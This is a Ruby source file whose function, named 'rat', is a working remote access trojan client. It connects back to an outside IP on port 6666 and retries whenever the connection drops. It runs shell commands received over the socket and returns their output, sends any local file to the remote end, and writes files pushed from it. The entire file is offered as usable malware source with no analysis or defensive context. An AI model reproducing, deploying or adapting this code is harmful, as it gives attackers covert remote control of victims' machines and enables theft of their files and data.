=begin
Copyright 2023 Chris Basinger

Licensed under the Apache License, Version 2.0(the "License");
you may not use this file except in compliance with the License .
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied .
See the License for the specific language governing permissions and
limitations under the License .
=end
#!/usr/bin/ruby
require 'socket'

def rat(ip)
  Thread.new do
    server = TCPServer.new 7777
    loop do
      server.accept.close
    end
  end
  begin
    socket = TCPSocket.new(ip, 6666)
    loop do
      command, file, format = socket.gets.chomp.split(' ')
      case command
      when 'session'
        loop do
          cmd = socket.gets.chomp
          if cmd == 'exit'
            break
          end
          begin
            socket.puts `#{cmd}`
          rescue Errno::ENOENT
            # This fixes a bug where `cd path` raises an exception
            if cmd.start_with?('cd')
              Dir.chdir cmd.split(' ').last
            else
              socket.puts 'invalid command'
            end
          end
          socket.puts 'done'
        end
      when 'get'
        if format == 'binary'
          file = File.open(file, 'rb')
        elsif format == 'text'
          file = File.open(file, 'r')
        else
          puts 'done'
        end

        content = file.read
        socket.puts content
        file.close
        socket.puts 'done'
      when 'put'

        if format == 'binary'
          file = File.open(file,'wb')
        elsif format == 'text'
          file = File.open(file,'w')
        else
          socket.puts 'done'
        end

        loop do
          content = socket.gets.chomp
          if content == 'done'
            break
          end
          file.puts content
        end
        file.close
      end
    end
    # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
  rescue
    sleep 2
    retry
  rescue Interrupt
    socket.close
  end

end